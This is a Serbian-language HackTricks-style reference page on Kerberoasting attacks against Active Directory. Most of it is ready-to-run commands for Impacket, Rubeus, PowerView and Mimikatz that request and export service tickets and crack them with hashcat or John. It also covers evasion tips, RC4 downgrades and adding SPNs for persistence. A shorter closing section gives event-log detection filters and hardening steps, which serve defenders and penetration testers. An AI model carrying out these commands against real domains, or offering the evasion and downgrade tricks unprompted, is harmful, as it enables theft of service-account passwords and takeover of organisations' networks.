# Kerberoast

{{#include ../../banners/hacktricks-training.md}}

## Kerberoast

Kerberoasting se fokusira na sticanje TGS karata, posebno onih koje se odnose na usluge koje rade pod korisničkim nalozima u Active Directory (AD), isključujući račune računara. Enkripcija ovih karata koristi ključeve koji potiču od korisničkih lozinki, što omogućava offline razbijanje kredencijala. Korišćenje korisničkog naloga kao usluge označeno je ne-praznim svojstvom ServicePrincipalName (SPN).

Svaki autentifikovani korisnik domena može zatražiti TGS karte, tako da nisu potrebne posebne privilegije.

### Ključne tačke

- Cilja TGS karte za usluge koje rade pod korisničkim nalozima (tj. računi sa postavljenim SPN; ne računi računara).
- Karte su enkriptovane ključem dobijenim iz lozinke servisnog naloga i mogu se razbiti offline.
- Nisu potrebne povišene privilegije; svaki autentifikovani nalog može zatražiti TGS karte.

> [!WARNING]
> Većina javnih alata preferira zahtev za RC4-HMAC (etype 23) servisne karte jer su brže za razbijanje od AES. RC4 TGS heševi počinju sa `$krb5tgs$23$*`, AES128 sa `$krb5tgs$17$*`, a AES256 sa `$krb5tgs$18$*`. Međutim, mnoge sredine prelaze na isključivo AES. Ne pretpostavljajte da je samo RC4 relevantan.
> Takođe, izbegavajte “spray-and-pray” roasting. Podrazumevani kerberoast Rubeusa može da upita i zatraži karte za sve SPN-ove i bučan je. Prvo enumerišite i ciljate zanimljive principe.

### Napad

#### Linux
```bash
# Metasploit Framework
msf> use auxiliary/gather/get_user_spns

# Impacket — request and save roastable hashes (prompts for password)
GetUserSPNs.py -request -dc-ip <DC_IP> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# With NT hash
GetUserSPNs.py -request -dc-ip <DC_IP> -hashes <LMHASH>:<NTHASH> <DOMAIN>/<USER> -outputfile hashes.kerberoast
# Target a specific user’s SPNs only (reduce noise)
GetUserSPNs.py -request-user <samAccountName> -dc-ip <DC_IP> <DOMAIN>/<USER>

# kerberoast by @skelsec (enumerate and roast)
# 1) Enumerate kerberoastable users via LDAP
kerberoast ldap spn 'ldap+ntlm-password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -o kerberoastable
# 2) Request TGS for selected SPNs and dump
kerberoast spnroast 'kerberos+password://<DOMAIN>\\<USER>:<PASS>@<DC_IP>' -t kerberoastable_spn_users.txt -o kerberoast.hashes
```
Alati sa više funkcija uključuju kerberoast provere:
```bash
# ADenum: https://github.com/SecuProject/ADenum
adenum -d <DOMAIN> -ip <DC_IP> -u <USER> -p <PASS> -c
```
#### Windows

- Enumerisati kerberoastable korisnike
```powershell
# Built-in
setspn.exe -Q */*   # Focus on entries where the backing object is a user, not a computer ($)

# PowerView
Get-NetUser -SPN | Select-Object serviceprincipalname

# Rubeus stats (AES/RC4 coverage, pwd-last-set years, etc.)
.\Rubeus.exe kerberoast /stats
```
- Tehnika 1: Zatražite TGS i preuzmite iz memorije
```powershell
# Acquire a single service ticket in memory for a known SPN
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"  # e.g. MSSQLSvc/mgmt.domain.local

# Get all cached Kerberos tickets
klist

# Export tickets from LSASS (requires admin)
Invoke-Mimikatz -Command '"kerberos::list /export"'

# Convert to cracking formats
python2.7 kirbi2john.py .\some_service.kirbi > tgs.john
# Optional: convert john -> hashcat etype23 if needed
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$*\1*$\2/' tgs.john > tgs.hashcat
```
- Tehnika 2: Automatski alati
```powershell
# PowerView — single SPN to hashcat format
Request-SPNTicket -SPN "<SPN>" -Format Hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
# PowerView — all user SPNs -> CSV
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\kerberoast.csv -NoTypeInformation

# Rubeus — default kerberoast (be careful, can be noisy)
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
# Rubeus — target a single account
.\Rubeus.exe kerberoast /user:svc_mssql /outfile:hashes.kerberoast
# Rubeus — target admins only
.\Rubeus.exe kerberoast /ldapfilter:'(admincount=1)' /nowrap
```
> [!WARNING]
> TGS zahtev generiše Windows Security Event 4769 (Zatražen je Kerberos servisni tiket).

### OPSEC i okruženja samo sa AES-om

- Namerno zatražite RC4 za naloge bez AES-a:
- Rubeus: `/rc4opsec` koristi tgtdeleg za enumeraciju naloga bez AES-a i zahteva RC4 servisne tikete.
- Rubeus: `/tgtdeleg` sa kerberoast takođe pokreće RC4 zahteve gde je to moguće.
- Pecajte naloge samo sa AES-om umesto da tiho propadnete:
- Rubeus: `/aes` enumeriše naloge sa uključenim AES-om i zahteva AES servisne tikete (etype 17/18).
- Ako već imate TGT (PTT ili iz .kirbi), možete koristiti `/ticket:<blob|path>` sa `/spn:<SPN>` ili `/spns:<file>` i preskočiti LDAP.
- Ciljanje, ograničavanje i manje buke:
- Koristite `/user:<sam>`, `/spn:<spn>`, `/resultlimit:<N>`, `/delay:<ms>` i `/jitter:<1-100>`.
- Filtrirajte za verovatno slabe lozinke koristeći `/pwdsetbefore:<MM-dd-yyyy>` (starije lozinke) ili ciljate privilegovane OU-e sa `/ou:<DN>`.

Primeri (Rubeus):
```powershell
# Kerberoast only AES-enabled accounts
.\Rubeus.exe kerberoast /aes /outfile:hashes.aes
# Request RC4 for accounts without AES (downgrade via tgtdeleg)
.\Rubeus.exe kerberoast /rc4opsec /outfile:hashes.rc4
# Roast a specific SPN with an existing TGT from a non-domain-joined host
.\Rubeus.exe kerberoast /ticket:C:\\temp\\tgt.kirbi /spn:MSSQLSvc/sql01.domain.local
```
### Kršenje
```bash
# John the Ripper
john --format=krb5tgs --wordlist=wordlist.txt hashes.kerberoast

# Hashcat
# RC4-HMAC (etype 23)
hashcat -m 13100 -a 0 hashes.rc4 wordlist.txt
# AES128-CTS-HMAC-SHA1-96 (etype 17)
hashcat -m 19600 -a 0 hashes.aes128 wordlist.txt
# AES256-CTS-HMAC-SHA1-96 (etype 18)
hashcat -m 19700 -a 0 hashes.aes256 wordlist.txt
```
### Persistence / Abuse

Ako kontrolišete ili možete da modifikujete nalog, možete ga učiniti kerberoastable dodavanjem SPN-a:
```powershell
Set-DomainObject -Identity <username> -Set @{serviceprincipalname='fake/WhateverUn1Que'} -Verbose
```
Smanjite nivo naloga da omogućite RC4 za lakše razbijanje (zahteva privilegije pisanja na ciljanom objektu):
```powershell
# Allow only RC4 (value 4) — very noisy/risky from a blue-team perspective
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=4}
# Mixed RC4+AES (value 28)
Set-ADUser -Identity <username> -Replace @{msDS-SupportedEncryptionTypes=28}
```
Možete pronaći korisne alate za kerberoast napade ovde: https://github.com/nidem/kerberoast

Ako dobijete ovu grešku iz Linux-a: `Kerberos SessionError: KRB_AP_ERR_SKEW (Clock skew too great)` to je zbog lokalnog vremenskog pomaka. Sinhronizujte sa DC:

- `ntpdate <DC_IP>` (deprecated na nekim distribucijama)
- `rdate -n <DC_IP>`

### Detekcija

Kerberoasting može biti neprimetan. Pratite Event ID 4769 sa DC-ova i primenite filtere da smanjite šum:

- Isključite ime usluge `krbtgt` i imena usluga koja se završavaju sa `$` (računi računara).
- Isključite zahteve sa računa mašine (`*$$@*`).
- Samo uspešni zahtevi (Kod greške `0x0`).
- Pratite tipove enkripcije: RC4 (`0x17`), AES128 (`0x11`), AES256 (`0x12`). Ne upozoravajte samo na `0x17`.

Primer PowerShell triage:
```powershell
Get-WinEvent -FilterHashtable @{Logname='Security'; ID=4769} -MaxEvents 1000 |
Where-Object {
($_.Message -notmatch 'krbtgt') -and
($_.Message -notmatch '\$$') -and
($_.Message -match 'Failure Code:\s+0x0') -and
($_.Message -match 'Ticket Encryption Type:\s+(0x17|0x12|0x11)') -and
($_.Message -notmatch '\$@')
} |
Select-Object -ExpandProperty Message
```
Dodatne ideje:

- Osnovna normalna upotreba SPN po hostu/korisniku; upozoriti na velike izlive različitih SPN zahteva od jednog principala.
- Oznaka neobične upotrebe RC4 u AES-ojačanim domenima.

### Ublažavanje / Ojačavanje

- Koristite gMSA/dMSA ili mašinske naloge za usluge. Upravljani nalozi imaju nasumične lozinke duže od 120 karaktera i automatski se rotiraju, što čini offline razbijanje nepraktičnim.
- Sprovodite AES na nalozima usluga postavljanjem `msDS-SupportedEncryptionTypes` na samo AES (decimal 24 / hex 0x18) i zatim rotirajte lozinku kako bi se AES ključevi izveli.
- Gde god je to moguće, onemogućite RC4 u vašem okruženju i pratite pokušaje korišćenja RC4. Na DC-ima možete koristiti `DefaultDomainSupportedEncTypes` registry vrednost da usmerite podrazumevane postavke za naloge bez postavljenog `msDS-SupportedEncryptionTypes`. Temeljno testirajte.
- Uklonite nepotrebne SPN-ove sa korisničkih naloga.
- Koristite duge, nasumične lozinke za naloge usluga (25+ karaktera) ako upravljani nalozi nisu izvodljivi; zabranite uobičajene lozinke i redovno vršite reviziju.

### Kerberoast bez domena (AS-zahtevani ST)

U septembru 2022. godine, Charlie Clark je pokazao da, ako principal ne zahteva prethodnu autentifikaciju, može se dobiti servisna karta putem kreiranog KRB_AS_REQ menjajući sname u telu zahteva, efektivno dobijajući servisnu kartu umesto TGT. Ovo odražava AS-REP roasting i ne zahteva važeće domenske akreditive.

Pogledajte detalje: Semperis članak “Novi napadi: AS-zahtevani ST”.

> [!WARNING]
> Morate pružiti listu korisnika jer bez važećih akreditiva ne možete upititi LDAP ovom tehnikom.

Linux

- Impacket (PR #1413):
```bash
GetUserSPNs.py -no-preauth "NO_PREAUTH_USER" -usersfile users.txt -dc-host dc.domain.local domain.local/
```
Windows

- Rubeus (PR #139):
```powershell
Rubeus.exe kerberoast /outfile:kerberoastables.txt /domain:domain.local /dc:dc.domain.local /nopreauth:NO_PREAUTH_USER /spn:TARGET_SERVICE
```
Related

Ako ciljate AS-REP roastable korisnike, pogledajte takođe:

{{#ref}}
asreproast.md
{{#endref}}

## References

- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1208-kerberoasting)
- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberoasting-requesting-rc4-encrypted-tgs-when-aes-is-enabled)
- Microsoft Security Blog (2024-10-11) – Microsoftove smernice za pomoć u ublažavanju Kerberoasting-a: https://www.microsoft.com/en-us/security/blog/2024/10/11/microsofts-guidance-to-help-mitigate-kerberoasting/
- SpecterOps – Rubeus Roasting dokumentacija: https://docs.specterops.io/ghostpack/rubeus/roasting

{{#include ../../banners/hacktricks-training.md}}
